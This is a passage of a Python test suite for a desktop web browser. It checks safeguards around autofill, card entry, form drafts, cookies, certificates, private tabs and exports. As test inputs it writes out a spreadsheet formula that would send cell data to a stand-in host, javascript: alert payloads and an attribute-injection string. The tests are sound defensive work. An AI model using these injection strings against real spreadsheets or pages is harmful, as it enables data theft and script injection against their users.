H.wait_for(lambda: jsq(v9, "document.querySelectorAll('iframe').length")
           == 1, 6000)
check("multistream builds its grid",
      H.js(v9, "document.querySelectorAll('iframe').length") == 1)
check("...embedded for the page it is built on",
      "parent=127.0.0.1" in str(H.js(v9, "document.querySelector('iframe')"
                                         ".src")))
H.load(v9, srv.url("/twother")); H.spin(1200)
check("the next page in that tab is left as it is",
      H.js(v9, "!!document.getElementById('other') && "
               "document.querySelectorAll('iframe').length === 0"))

# a host that only contains discord.com is not Discord
check("subdomain counts as the host", br._host_is("ptb.discord.com",
                                                   "discord.com"))
check("a look-alike host does not",
      not br._host_is("notdiscord.com", "discord.com")
      and not br._host_is("discord.com.example.net", "discord.com"))
br.config["discordRoute"] = True
v10 = br.new_tab(); H.spin(300)
H.load(v10, srv.url("/twhome")); H.spin(600)
check("a link to x127.0.0.1.invalid is not routed into the 127.0.0.1 tab",
      br.discord_route("http://x127.0.0.1.invalid/", host="127.0.0.1")
      is False)
br.config["discordRoute"] = False

# an address fill goes only into boxes he can see
v11 = br.new_tab(); H.spin(300)
H.load(v11, srv.url("/sneaky")); H.spin(600)
_got = []
br.form_tool("fillident", view=v11, then=_got.append, arg={
    "fullname": "Ada Tester", "email": "ada@example.com",
    "phone": "+49 30 1", "street": "Teststr. 5", "city": "Berlin",
    "zip": "10115", "country": "Germany"})
H.wait_for(lambda: _got, 4000)
_vals = H.js(v11, "JSON.stringify(['full','mail','street','tel','zip','city',"
                  "'country'].map(function(i){return document"
                  ".getElementById(i).value}))")
check("the boxes he can see are filled",
      _vals and '"Ada Tester","ada@example.com"' in _vals, _vals)
check("off-screen, see-through, 1px and clipped boxes stay empty",
      _vals and _vals.endswith('"","","","",""]'), _vals)

# a card is not typed into a page that sends it in the clear
check("https is a place for a card",
      br._card_safe_url("https://shop.example/pay"))
check("this machine is too", br._card_safe_url("http://127.0.0.1:8000/")
      and br._card_safe_url("http://localhost/"))
check("plain http elsewhere is not",
      not br._card_safe_url("http://shop.example/pay"))
_said = []
_flash = br.flash
br.flash = lambda text, *a, **k: _said.append(str(text))
v12 = br.new_tab(); H.spin(300)
v12.load(B.QUrl("http://shop.invalid/pay")); H.spin(1500)
br.fill_card(view=v12, cvv="1")
br.flash = _flash
check("filling a card there is refused, and says why",
      _said == [br._ui_str("cardInsecure")], str(_said))

# a form draft never keeps a card number, a security code, an IBAN or a
# one-time code, and it goes back into the box it came from
import json as _json
br.config["formDraftsOn"] = True
v13 = br.new_tab(); H.spin(300)
H.load(v13, srv.url("/checkout2")); H.spin(600)
H.js(v13, "document.getElementById('msg').value='Long message here';"
          "document.getElementById('num').value='4111111111111111';"
          "document.querySelector('[name=cvc]').value='987';"
          "document.getElementById('ib').value='DE89370400440532013000';"
          "document.querySelector('[name=otp_code]').value='654321';"
          "document.querySelector('.t2').value='second box';")
_saved = []
br.save_form_draft(view=v13, then=_saved.append)
H.wait_for(lambda: _saved, 4000)
_disk = _json.dumps(br.config.get("formDrafts"))
check("the draft keeps the message", "Long message here" in _disk, _disk)
check("...but no card number, code, IBAN or one-time code",
      not any(x in _disk for x in ("4111111111111111", '"987"',
                                   "DE89370400440532013000", "654321")),
      _disk)
H.load(v13, srv.url("/checkout2")); H.spin(1200)
_back = []
br.restore_form_draft(view=v13, then=_back.append)
H.wait_for(lambda: _back, 4000)
H.spin(200)
check("a box with no name gets its own text back, not its neighbour's",
      H.js(v13, "document.querySelector('.t1').value") == ""
      and H.js(v13, "document.querySelector('.t2').value") == "second box",
      str((H.js(v13, "document.querySelector('.t1').value"),
           H.js(v13, "document.querySelector('.t2').value"))))
br.config["formDrafts"] = {"shop.example/pay": {"when": 1, "rows": [
    {"key": "#cardnumber", "value": "4111"},
    {"key": "input[name=otp_code]", "value": "1"},
    {"key": "#msg", "value": "keep me"}]}}
br.config["formHistory"] = {"shop.example": {"cvc": ["123"],
                                             "city": ["Berlin"]}}
br._scrub_secret_rows()
check("drafts already on disk lose their card rows",
      br.config["formDrafts"]["shop.example/pay"]["rows"]
      == [{"key": "#msg", "value": "keep me"}],
      str(br.config["formDrafts"]))
check("...and the form history its codes",
      br.config["formHistory"] == {"shop.example": {"city": ["Berlin"]}},
      str(br.config["formHistory"]))
br.config["formDrafts"] = {}
br.config["formHistory"] = {}

# an http login box belongs to the page in the tab, not to a picture
# another site pulled in from that host
_asked_auth = []
_real_get = B.QInputDialog.getText
B.QInputDialog.getText = staticmethod(
    lambda *a, **k: (_asked_auth.append(1), ("", False))[1])
_pw_was = br.config.get(B.VAULT_PASSWORD_KEY, True)
br.config[B.VAULT_PASSWORD_KEY] = True
br.vault.set_entry("localhost", "http", "ada", "letmein")
br._auth_tried = {}
v14 = br.new_tab(); H.spin(300)
H.load(v14, srv.url("/imgauth")); H.spin(2000)
check("another site's frame gets no saved login",
      not any("/auth/" in k for k in br._auth_tried), str(br._auth_tried))
check("...and puts up no dialog", _asked_auth == [], str(_asked_auth))
H.load(v14, srv.url("/auth/panel", host="localhost"))
H.wait_for(lambda: "you are in" in (jsq(v14, "document.body.innerText")
                                    or ""), 8000)
check("the tab's own page still gets the saved login, with no dialog",
      "you are in" in (H.js(v14, "document.body.innerText") or "")
      and _asked_auth == [],
      str(((H.js(v14, "document.body.innerText") or "")[:30], _asked_auth)))
B.QInputDialog.getText = _real_get
br.config[B.VAULT_PASSWORD_KEY] = _pw_was

# exported tables carry no cell a spreadsheet would run
import csv as _csv
_xdir = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
br.export_history(str(_xdir / "h.csv"), "csv", rows=[
    {"t": 0, "title": '=WEBSERVICE("http://x.invalid/?"&C2)',
     "url": "https://a.example/", "s": "main"}])
_cells = list(_csv.reader(open(str(_xdir / "h.csv"), encoding="utf-8")))
check("history export: a page title cannot be a formula",
      _cells[1][1].startswith("'="), str(_cells))
_dl_was = list(br.downloads)
br.downloads[:] = [{"id": "x", "name": "+cmd.csv", "url": "https://a/",
                    "from": "", "size": 1, "t": 0, "state": "done"}]
br.export_downloads(str(_xdir / "d.csv"))
br.downloads[:] = _dl_was
_cells = list(_csv.reader(open(str(_xdir / "d.csv"), encoding="utf-8")))
check("downloads export: a file name cannot be a formula",
      _cells[1][0] == "'+cmd.csv", str(_cells))

# opening a downloaded .jar runs it (Java takes it from xdg-open): asked
# first, from the downloads page's Open as much as from the menu
(_xdir / "mod.jar").write_bytes(b"PK not really")
_dl_was = list(br.downloads)
br.downloads[:] = [{"id": 991, "name": "mod.jar", "dir": str(_xdir),
                    "url": "https://a/", "t": 0, "state": "done"}]
_q, _opened = [], []
_real_q = B.QMessageBox.question
_real_open = B.QDesktopServices.openUrl
_real_popen = B.subprocess.Popen
B.QMessageBox.question = staticmethod(
    lambda *a, **k: (_q.append(1), B.QMessageBox.StandardButton.No)[1])
B.QDesktopServices.openUrl = staticmethod(lambda u: _opened.append(u))
B.subprocess.Popen = lambda *a, **k: _opened.append(a)
br.open_download(991)
br.open_download_file(991)
B.QMessageBox.question = _real_q
B.QDesktopServices.openUrl = _real_open
B.subprocess.Popen = _real_popen
br.downloads[:] = _dl_was
check("a downloaded .jar is not run without a yes, from either Open",
      _q == [1, 1] and _opened == [], str((_q, _opened)))

# taking files out of an archive never writes over his own
import zipfile as _zf
(_xdir / "readme.txt").write_text("mine")
with _zf.ZipFile(str(_xdir / "pack.zip"), "w") as z:
    z.writestr("inner/readme.txt", "theirs")
_one = br.archive_file(str(_xdir / "pack.zip"), "inner/readme.txt")
check("one file out of an archive leaves the file already there alone",
      (_xdir / "readme.txt").read_text() == "mine" and _one
      and _Path(_one).read_text() == "theirs", str(_one))
_first = br.extract_archive(path=str(_xdir / "pack.zip"), ask=False)
(_Path(_first) / "inner" / "readme.txt").write_text("edited by him")
_second = br.extract_archive(path=str(_xdir / "pack.zip"), ask=False)
check("unpacking again goes into a new folder, not over his edits",
      _second and _second != _first
      and (_Path(_first) / "inner" / "readme.txt").read_text()
      == "edited by him", str((_first, _second)))

# "strip metadata" strips it: no comment, no XMP with a GPS position
_img = B.QImage(8, 8, B.QImage.Format.Format_RGB32)
_img.fill(B.QColor("red"))
_img.setText("Comment", "secret-comment")
_img.setText("XML:com.adobe.xmp", "<x><exif:GPSLatitude>52,31.0N"
             "</exif:GPSLatitude></x>")
_img.save(str(_xdir / "snap.png"), "PNG")
_png = br.strip_metadata(str(_xdir / "snap.png"))
_jpg = br.strip_metadata(str(_xdir / "snap.png"), into="jpg")
_back = B.QImage(_png)
check("stripped picture: no text keys left",
      _png and _back.textKeys() == [], str(_back.textKeys()))
check("...and none written into a JPEG either",
      _jpg and b"GPSLatitude" not in open(_jpg, "rb").read()
      and b"secret-comment" not in open(_jpg, "rb").read())
check("...with the same pixels", _back.pixelColor(3, 3) == B.QColor("red"),
      str(_back.pixelColor(3, 3).name()))
check("a PNG with only a text chunk counts as carrying metadata",
      br.image_has_metadata(str(_xdir / "snap.png")))
check("...and the stripped copy as carrying none",
      not br.image_has_metadata(_png))
(_xdir / "pic.png").write_bytes(b"his own picture")
_img.save(str(_xdir / "pic.bmp"), "BMP")
_conv = br.convert_image(str(_xdir / "pic.bmp"), into="png")
check("converting never replaces a file already there",
      (_xdir / "pic.png").read_bytes() == b"his own picture"
      and _conv and _conv != str(_xdir / "pic.png"), str(_conv))

# yt-dlp finishes even when it talks a lot, and a private tab's video
# is not written into the downloads list
import os as _os, stat as _stat
_bin = _xdir / "bin"
_bin.mkdir()
(_bin / "yt-dlp").write_text("#!/bin/sh\nhead -c 300000 /dev/zero "
                             "| tr '\\0' x\nexit 0\n")
(_bin / "yt-dlp").chmod(0o755)
_path_was = _os.environ.get("PATH", "")
_os.environ["PATH"] = str(_bin) + ":" + _path_was
br.config["downloadDir"] = str(_xdir)
_said_dl = []
br.save_with_ytdlp(url="https://video.example/v", view=v14,
                   then=_said_dl.append)
H.wait_for(lambda: _said_dl, 15000)
check("a chatty yt-dlp still finishes", _said_dl == ["done"], str(_said_dl))
_pv = br.new_private_tab(); H.spin(400)
_rows_before = len(br.downloads)
_said_dl2 = []
br.save_with_ytdlp(url="https://video.example/secret", view=_pv,
                   then=_said_dl2.append)
H.wait_for(lambda: _said_dl2, 15000)
check("a private tab's video leaves no row in the downloads list",
      len(br.downloads) == _rows_before
      and not any("secret" in str(e.get("url")) for e in br.downloads),
      str(len(br.downloads) - _rows_before))
_os.environ["PATH"] = _path_was

# saving a page as a file never replaces one already there, and a
# private tab's page is saved without a row in the list
br.config["downloadDir"] = str(_xdir)
(_xdir / "other.md").write_text("his own notes")
v15 = br.new_tab(); H.spin(300)
H.load(v15, srv.url("/twother")); H.spin(600)
_md = []
br.save_page_markdown(view=v15, then=_md.append)
H.wait_for(lambda: _md, 6000)
check("a saved page does not replace his file of the same name",
      (_xdir / "other.md").read_text() == "his own notes" and _md
      and _md[0].endswith("other (1).md"), str(_md))
H.load(_pv, srv.url("/twother")); H.spin(800)
_rows_before = len(br.downloads)
_md2 = []
br.save_page_markdown(view=_pv, then=_md2.append)
H.wait_for(lambda: _md2, 6000)
check("a private tab's saved page is not written into the list",
      _md2 and _md2[0] and len(br.downloads) == _rows_before,
      str((_md2, len(br.downloads) - _rows_before)))

# the address bar's "whole address" tooltip shows the address, not what
# its decoded letters spell out as markup
_long = ("https://e.example/" + "x" * 300
         + "%3Ch1%3Ehttps://bank.example%3C/h1%3E")
br.show_address(_long)
_tip = br.urlbar.toolTip()
from PyQt6.QtGui import QTextDocument as _QTD
_doc = _QTD()
_doc.setHtml(_tip)
check("the long-address tooltip is plain text",
      "<h1>https://bank.example</h1>" in _doc.toPlainText()
      and "<h1>" not in _tip, _tip[-80:])
check("an empty tooltip stays empty", B.literal("") == "")

# the lock menu lists this site's permissions, not every site whose
# name contains this one's
_perm_was = br.config.get("permissions")
br.config["permissions"] = {"http://127.0.0.1:1|camera": "allow",
                            "https://x127.0.0.1.example|mic": "allow"}
_facts = br.site_info(v15)
check("site info: only this host's grants",
      list(_facts.get("permissions", {})) == ["http://127.0.0.1:1|camera"],
      str(_facts.get("permissions")))
br.config["permissions"] = _perm_was

# a site's search template is a web address or nothing
check("a javascript: search template is refused",
      br.note_opensearch("evil.example", "x",
                         "javascript:alert(1)//{searchTerms}") is False
      and "evil.example" not in br.opensearch_table())
check("an https one is kept",
      br.note_opensearch("good.example", "g",
                         "https://good.example/?q={searchTerms}") is True)
br.opensearch_table().pop("good.example", None)

# the cookie editor: one site's cookies, one jar, and a delete that
# reaches the engine
def _ck(name, value, domain):
    c = B.QNetworkCookie(name.encode(), value.encode())
    c.setDomain(domain)
    c.setPath("/")
    return c
v16 = br.new_tab(); H.spin(300)
H.load(v16, srv.url("/twhome")); H.spin(400)
_jar = br._view_jar(v16)
br._note_cookie(_ck("sess", "netflix-session", ".netflix.com"), jar=_jar)
br._note_cookie(_ck("xs", "x-own", ".x.com"), jar=_jar)
br._note_cookie(_ck("priv", "private-one", ".x.com"), jar="private")
_names = sorted(r["name"] for r in br.site_cookies("x.com"))
check("x.com's cookies are x.com's, from this jar only", _names == ["xs"],
      str(_names))
_txt = br.cookies_txt("x.com", str(_xdir / "cookies.txt"))
_body = open(_txt).read() if _txt else ""
check("...and so is its cookies.txt",
      "x-own" in _body and "netflix-session" not in _body
      and "private-one" not in _body, _body[-200:])
H.load(v16, srv.url("/setck")); H.spin(1200)
check("a page cookie is there to delete",
      "srv=1" in str(H.js(v16, "document.cookie")))
check("deleting it from the editor says so",
      br.delete_cookie("srv", "127.0.0.1", "/") is True)
H.spin(800)
check("...and the page no longer has it",
      "srv=1" not in str(H.js(v16, "document.cookie")),
      str(H.js(v16, "document.cookie")))

# a jar made after start-up (the private one here) has the same
# interceptor: blocked addresses stay blocked, and its requests stay
# out of the request log. (An earlier block closed this window's last
# tab, which closes the window and runs the exit clean-up that hands the
# interceptor back; asking again puts it back on every jar.)
br.request_watch()
br.config["urlRules"] = "/blockme"
v17 = br.new_tab(); H.spin(300)
H.load(v17, srv.url("/blockme")); H.spin(800)
check("a blocked address is blocked in a normal tab",
      H.js(v17, "!!document.getElementById('b')") is not True)
H.load(_pv, srv.url("/blockme")); H.spin(800)
check("...and in a private tab, whose jar came later",
      H.js(_pv, "!!document.getElementById('b')") is not True)
_vb = br.new_tab(session="reviewvb"); H.spin(300)
H.load(_vb, srv.url("/blockme")); H.spin(800)
check("...and in a virtual browser made after that",
      _vb.page().profile() is not br.profile
      and H.js(_vb, "!!document.getElementById('b')") is not True)
br.config["urlRules"] = ""
br.log_requests(True)
H.load(_pv, srv.url("/twother?private-visit")); H.spin(800)
H.load(v17, srv.url("/twother?normal-visit")); H.spin(800)
_urls = [r["url"] for r in br.request_rows()]
br.log_requests(False)
check("the request log has the normal tab's request",
      any("normal-visit" in u for u in _urls), str(_urls[:4]))
check("...and not the private one's",
      not any("private-visit" in u for u in _urls), str(_urls[:4]))

# a virus scan runs beside the window, not on it
(_bin / "clamscan").write_text("#!/bin/sh\nsleep 1.5\nexit 1\n")
(_bin / "clamscan").chmod(0o755)
_os.environ["PATH"] = str(_bin) + ":" + _path_was
(_xdir / "scanme.bin").write_bytes(b"x")
_dl_was = list(br.downloads)
br.downloads[:] = [{"id": 992, "name": "scanme.bin", "dir": str(_xdir),
                    "url": "https://a/", "t": 0, "state": "done"}]
_scan = []
_t0 = _time.time()
br.scan_download(992, then=_scan.append)
_took = _time.time() - _t0
check("starting a scan does not hold the window", _took < 0.5,
      "%.2fs" % _took)
H.wait_for(lambda: _scan, 8000)
check("...and its answer still arrives", _scan == ["infected"], str(_scan))
br.downloads[:] = _dl_was
_os.environ["PATH"] = _path_was

# pages the browser builds out of text run no script
v18 = br.new_tab(); H.spin(300)
br.show_html("<!doctype html><title>t</title><script>document.title="
             "'ran'</script><a id=l href=\"javascript:document.title="
             "'clicked'\">x</a>", view=v18)
# the built page itself, before it is clicked: at a 30% CPU quota the
# check read the tab before the page was in
H.wait_for(lambda: jsq(v18, "!!document.getElementById('l')") is True, 8000)
H.js(v18, "document.getElementById('l').click(); 1"); H.spin(400)
_t18 = jsq(v18, "document.title")
check("a built page's script and javascript: link stay dead",
      _t18 == "t", str(_t18))
_mm = br.minimessage_html('<gradient:red" onmouseover="alert(1):blue>hi')
check("a MiniMessage gradient cannot write an attribute",
      'onmouseover="' not in _mm and "<span" not in _mm, _mm[-160:])
check("...while a real one still draws",
      "linear-gradient(90deg,#ff5555,#5555ff)"
      in br.minimessage_html("<gradient:red:blue>hi"))
H.load(v18, srv.url("/twhome")); H.spin(500)
br.override_place(view=v18, zone="Asia/Kolkata"); H.spin(300)
check("a half-hour time zone is told as one",
      H.js(v18, "new Date().getTimezoneOffset()") == -330,
      str(H.js(v18, "new Date().getTimezoneOffset()")))
br.responsive_preview("phone", view=v18)
def _all_actions(m):
    for a in m.actions():
        yield a
        if a.menu() is not None:
            yield from _all_actions(a.menu())
_off = [a for a in _all_actions(br.dev_menu())
        if a.text() == br._ui_str("devSizeOff")]
if _off:
    _off[0].trigger()
check("the dev menu's size off gives the tab its size back",
      _off and v18.maximumWidth() == 16777215, str(v18.maximumWidth()))
br.request_watch().log[:] = [{"url": "https://a/", "host": "a",
                              "method": "GET", "kind": 0, "t": 0}]
_har = br.export_har(str(_xdir / "r.har"))
check("a HAR's times are UTC, as its Z says",
      '"1970-01-01T00:00:00Z"' in open(_har).read() if _har else False)
br.request_watch().log[:] = []
check("a typed javascript: address is searched for, never run",
      not br._resolve_typed("javascript://%0aalert(1)").lower()
      .startswith("javascript"), br._resolve_typed("javascript://%0aalert(1)"))

# Sec-GPC goes out with ad blocking off, too
br.config["adBlock"] = False
_gkey = B.Browser.GUARD_KEY.get("gpc") if hasattr(B.Browser, "GUARD_KEY") \
    else None
if _gkey and B.page_guard is not None:
    _gpc_was = br.config.get(_gkey)
    br.config[_gkey] = True
    H.load(v18, srv.url("/echo")); H.spin(800)
    _hdrs = str(H.js(v18, "document.body.innerText"))
    check("with the GPC guard on, Sec-GPC is sent (ad blocking off)",
          "sec-gpc: 1" in _hdrs.lower(), _hdrs[:300])
    br.config[_gkey] = _gpc_was

# "allow this time" is this time: the engine does not write it down
# behind the browser's back, and the next visit asks again
from PyQt6.QtWebEngineCore import QWebEnginePermission as _QWP
v19 = br.new_tab(); H.spin(300)
H.load(v19, srv.url("/notif")); H.spin(1500)
_card = getattr(br, "_perm_widget", None)
_once = _card.findChild(B.QToolButton, "permonce") if _card is not None \
    else None
check("a site asking for notifications gets a card with 'this time'",
      _once is not None)
if _once is not None:
    _once.click(); H.spin(800)
check("...and 'this time' answers it", H.js(v19, "window.asked") == "granted",
      str(H.js(v19, "window.asked")))
_st = br.profile.queryPermission(
    B.QUrl(srv.url("/")), _QWP.PermissionType.Notifications).state()
check("the engine keeps no grant of its own after 'this time'",
      _st != _QWP.State.Granted, str(_st))
br._perm_widget = None
br.close_tab(br.tabs.indexOf(v19), ask=False); H.spin(500)
v19 = br.new_tab(); H.spin(300)
H.load(v19, srv.url("/notif")); H.spin(1500)
_card2 = getattr(br, "_perm_widget", None)
check("...so the next visit, in a new tab, asks again",
      _card2 is not None and H.js(v19, "window.asked") == "",
      str((H.js(v19, "window.asked"), _card2)))
if _card2 is not None:
    _deny = _card2.findChild(B.QToolButton, "permdeny")
    if _deny is not None:
        _deny.click(); H.spin(400)

# the status line shows where a link goes as text, never as markup
br.show_hovered_link("https://www.google.com/url?q=https://x.example/"
                     "%3Ch1%3Ehttps://bank.example%3C/h1%3E")
_hl = getattr(br, "_hoverlbl", None)
check("the status line is plain text",
      _hl is not None and _hl.textFormat() == B.Qt.TextFormat.PlainText
      and "<h1>" in _hl.text(), _hl.text() if _hl is not None else None)
_sl_was = br.config.get("statusLine")
br.config["statusLine"] = "bar"
br.urlbar.clearFocus()
br.show_hovered_link("https://www.google.com/url?q=https://x.example/"
                     "%3Ch1%3Ehttps://bank.example%3C/h1%3E")
_bh = getattr(br, "_barhover", None)
check("...and so is the one laid over the address bar",
      _bh is not None and _bh.textFormat() == B.Qt.TextFormat.PlainText,
      str(_bh.textFormat()) if _bh is not None else None)
br.config["statusLine"] = _sl_was or "bottom"

# a certificate exception is that certificate, or nothing
br.config["certExceptions"] = {"legacy.lan": True}
check("an old catch-all exception no longer passes any certificate",
      br.certificate_excepted("legacy.lan", "ab" * 32) is False)
check("...though the host still shows as having one",
      br.certificate_excepted("legacy.lan") is True)
check("a yes with no certificate to pin is not kept",
      br.trust_certificate("nofp.lan", "") is False
      and "nofp.lan" not in br.certificate_exceptions())
br.config["certExceptions"] = {}

# menu entries whose lambda took the "checked" flag as their argument
br.tabs.setCurrentWidget(v15); H.spin(200)
_got = []
_sc, _scn = br.show_certificate, br.show_connection
br.show_certificate = lambda h=None: _got.append(("cert", h))
br.show_connection = lambda h=None: _got.append(("conn", h))
for _a in br.certificate_menu().actions():
    if _a.text() in (br._ui_str("certShow") % "127.0.0.1",
                     br._ui_str("connDetails")):
        _a.trigger()
br.show_certificate, br.show_connection = _sc, _scn
check("the lock menu's certificate and connection entries get the host",
      _got == [("cert", "127.0.0.1"), ("conn", "127.0.0.1")], str(_got))

# a locked window's title says nothing about the page behind the cover
br.set_browser_lock("review-lock")
br._sync_window_title()
_was_title = br.windowTitle()
br.lock_browser()
check("a locked window's title hides the page's",
      "other" in _was_title and "other" not in br.windowTitle(),
      str((_was_title, br.windowTitle())))
br.unlock_browser()
check("...and unlocking brings it back", "other" in br.windowTitle(),
      br.windowTitle())
br.set_browser_lock("")

# a secret the browser copies stays out of clip histories, its own and
# the desktop's
br.watch_clipboard(True)
br._copy_secret_text("hunter2-review")
H.spin(300)
_md = B.QGuiApplication.clipboard().mimeData()
check("a copied secret carries the desktop's 'do not keep' hint",
      _md is not None and bytes(_md.data("x-kde-passwordManagerHint"))
      == b"secret")
_clips = [c["text"] for c in (br.desk().clips() if br.desk() else [])]
check("...and is not in the browser's clip history",
      "hunter2-review" not in _clips, str(_clips[:3]))
br.watch_clipboard(False)

# a page cannot make the snippet expander type out a snippet for it
_drawer = br.desk()
if _drawer is not None:
    _drawer.set_snippet("zqsnip", "SECRET-SNIPPET-TEXT")
    br.config["snippets"] = True
    br.refresh_snippet_script()
    v20 = br.new_tab(); H.spin(300)
    H.load(v20, srv.url("/drafts")); H.spin(800)
    H.js(v20, "var f=document.getElementById('n'); f.focus();"
              "f.value='zqsnip '; f.setSelectionRange(7,7);"
              "f.dispatchEvent(new KeyboardEvent('keyup',"
              "{key:' ',bubbles:true})); 1")
    H.spin(300)
    check("a page's own fake key press does not expand a snippet",
          "SECRET" not in str(H.js(v20, "document.getElementById('n').value")),
          str(H.js(v20, "document.getElementById('n').value")))
    H.js(v20, "var f=document.getElementById('n'); f.value=''; f.focus(); 1")
    v20.setFocus(); H.spin(100)
    H.type_text(v20, "zqsnip ")
    H.spin(300)
    check("...while real typing still does",
          "SECRET-SNIPPET-TEXT" in str(H.js(v20,
                                           "document.getElementById('n').value")),
          str(H.js(v20, "document.getElementById('n').value")))
    _drawer.set_snippet("zqsnip", "")
    br.refresh_snippet_script()

# two timers of the same name: the first one up takes only itself
br.config["timers"] = []
br.start_timer(1)
br.start_timer(2)
br.timers()[0]["at"] = 1
br._desk_tick()
check("a timer that is up leaves its namesake running",
      len(br.timers()) == 1 and br.timers()[0]["at"] > 1, str(br.timers()))
br.config["timers"] = []

# a private tab is not snoozed (written down, back as an ordinary tab)
_snz_was = list(br.config.get("snoozed") or [])
check("a private tab cannot be snoozed",
      br.snooze_tab(index=br.tabs.indexOf(_pv), minutes=5) is None
      and list(br.config.get("snoozed") or []) == _snz_was
      and br.tabs.indexOf(_pv) >= 0)
# and twelve due snoozes open ten now and keep two, not drop them
br.config["snoozed"] = [{"url": srv.url("/twhome?s=%d" % i), "title": "s",
                         "at": 1} for i in range(12)]
check("ten due snoozes open at a time...", br.wake_snoozed() == 10)
check("...and the other two wait for the next look",
      len(br.snoozed_tabs()) == 2, len(br.snoozed_tabs()))
br.config["snoozed"] = _snz_was

# a new day warns again about a site limit
br._limit_said = {"x.example": True}
br._limit_warned = {"x.example": True}
br.config["siteTime"] = {"day": "2000-01-01", "x.example": 9999}
br.site_minutes_today()
check("the day roll-over lets the limit warnings come again",
      br._limit_said == {} and br._limit_warned == {})

# exporting the highlights twice keeps both files
br.config["highlights"] = {"https://a.example/": ["one marked line"]}
_h1 = br.export_highlights()
_h2 = br.export_highlights()
check("a second highlights export does not replace the first",
      _h1 and _h2 and _h1 != _h2, str((_h1, _h2)))
br.config["highlights"] = {}

# an encrypted history is never written out plain while the vault is shut,
# and what was read meanwhile is kept and written under the key later
_hf = B.HISTORY_FILE
_hist_was = list(br.history)
_file_was = _hf.read_bytes() if _hf.exists() else None
_enc_was = br.config.get("historyEncrypted")
_key = b"k" * 32
br.config["historyEncrypted"] = True
br.history_key = lambda: _key
br.history[:] = [{"url": "https://older.example/", "title": "Older", "t": 1}]
br.save_history()
br.history_key = lambda: None
br._history_locked = True
br.history[:] = []
_sealed = _hf.read_bytes()
br._record_history(B.QUrl("https://visited-while-locked.example/"),
                   "Locked visit")
_now = _hf.read_bytes()
check("with the vault shut, the encrypted history file is left alone",
      _now == _sealed and _now.startswith(B.HISTORY_MAGIC), _now[:12])
check("...and no visit lands on disk in the clear",
      b"visited-while-locked" not in _now)
br.history_key = lambda: _key
br.unlock_history()
_urls = [e["url"] for e in br.history]
check("opening the vault brings back the old history and keeps the new",
      _urls == ["https://older.example/",
                "https://visited-while-locked.example/"], str(_urls))
br._history_locked = False
check("...and both are written down, under the key",
      [e["url"] for e in br._read_history()] == _urls
      and _hf.read_bytes().startswith(B.HISTORY_MAGIC))
br.__dict__.pop("history_key", None)
br.config["historyEncrypted"] = _enc_was
br._history_locked = False
br._history_unsaved = False
br.history[:] = _hist_was
if _file_was is None:
    _hf.unlink()
else:
    _hf.write_bytes(_file_was)

# a toast is text: a web notification cannot draw its own "browser" message
class _Note2:
    def origin(self): return B.QUrl("https://n.example/")
    def title(self): return "<h1>Update required</h1>"
    def message(self): return "body"
    def show(self): pass
    def close(self): pass
br.config["desktopNotify"] = False
br._web_notification(_Note2(), private=True)
_fl = getattr(br, "_flash", None)
check("a notification's title shows as text in the toast",
      _fl is not None and _fl.textFormat() == B.Qt.TextFormat.PlainText
      and "<h1>" in _fl.text(), _fl.text() if _fl is not None else None)

# "close unused tabs" keeps the normal ones as bookmarks, never a private one
_pv3 = br.new_private_tab(); H.spin(300)
H.load(_pv3, srv.url("/twother?unused-private")); H.spin(600)
br.tabs.setCurrentWidget(v15); H.spin(100)
# after the switch: leaving a tab marks it as just seen
_pv3._last_seen = 1
_bm_before = len(br.bookmarks)
_closed = br.close_unused_tabs(days=1)
check("closing unused tabs does not bookmark a private one",
      any(r["view"] is _pv3 for r in _closed)
      and not any("unused-private" in str(e.get("url"))
                  for e in br.bookmarks),
      str((len(_closed), len(br.bookmarks) - _bm_before)))

# a capture copied "with its link" carries no path of this machine
if B.capture is not None:
    br.config["shotDir"] = str(_xdir)
    _pic = B.QImage(20, 20, B.QImage.Format.Format_RGB32)
    _pic.fill(B.QColor("blue"))
    _txt = br.copy_with_link(image=_pic, view=v15)
    _md = B.QGuiApplication.clipboard().mimeData()
    check("a capture with its link names the page, not a local file",
          _txt and "file://" not in _txt
          and "file://" not in (_md.html() if _md is not None else "")
          and _md is not None and _md.hasImage(), str(_txt)[:120])

# a private tab is not captured by any of the capture tools
if B.capture is not None:
    br.config["shotPrivate"] = False
    _pv4 = br.new_private_tab(); H.spin(300)
    H.load(_pv4, srv.url("/twother")); H.spin(600)
    br.tabs.setCurrentWidget(_pv4); H.spin(100)
    _caps_before = list(br.config.get("shotHistory") or [])
    _outs = [br.copy_with_link(view=_pv4), br.annotate(view=_pv4),
             br.stamp_capture(view=_pv4), br.shot_mobile(view=_pv4),
             br.shot_inner("p", view=_pv4), br.capture_diff(view=_pv4),
             br.timelapse(True, view=_pv4)]
    check("no capture tool pictures a private tab",
          all(not o for o in _outs)
          and list(br.config.get("shotHistory") or []) == _caps_before,
          str(_outs))
    br.timelapse(False)

# a tab recorded with its sound records the output, not the microphone
class _FakeProc:
    started = []
    def __init__(self, *a, **k): pass
    def start(self, prog, args): _FakeProc.started.append([prog] + list(args))
_real_qp = B.QProcess
_real_tools = br.record_tools
B.QProcess = _FakeProc
for _rec in ("/usr/bin/parec", "/usr/bin/ffmpeg"):
    br.record_tools = lambda r=_rec: {"recorder": r}
    br._record_audio_start(microphone=False)
    br._record_audio_start(microphone=True)
B.QProcess = _real_qp
br.__dict__.pop("record_tools", None)
_tab_p, _mic_p, _tab_f, _mic_f = _FakeProc.started
check("parec records the output's monitor for a tab, the source for a voice",
      "--device=@DEFAULT_MONITOR@" in _tab_p
      and "--device=@DEFAULT_SOURCE@" in _mic_p, str((_tab_p, _mic_p)))
check("...and so does ffmpeg",
      _tab_f[_tab_f.index("-i") + 1] == "@DEFAULT_MONITOR@"
      and _mic_f[_mic_f.index("-i") + 1] == "@DEFAULT_SOURCE@",
      str((_tab_f, _mic_f)))

# captions are never made from a file of his a page points its video at
_jobs, _said_cap = [], []
_ct = br.caption_tools
br.caption_tools = lambda: {"captionTranscriber": "/bin/true"}
_ff_was = br.config.get("ffmpegPath")
br.config["ffmpegPath"] = "/bin/true"
br._caption_job = lambda *a, **k: _jobs.append(a)
v21 = br.new_tab(); H.spin(300)
H.load(v21, srv.url("/vidfile")); H.spin(800)
br.make_captions(view=v21, then=_said_cap.append)
H.wait_for(lambda: _said_cap, 4000)
check("a page's file:// video is not handed to ffmpeg",
      _jobs == [] and _said_cap == [{"refused": True}], str((_jobs, _said_cap)))
for _n in ("caption_tools", "_caption_job"):
    br.__dict__.pop(_n, None)
br.config["ffmpegPath"] = _ff_was

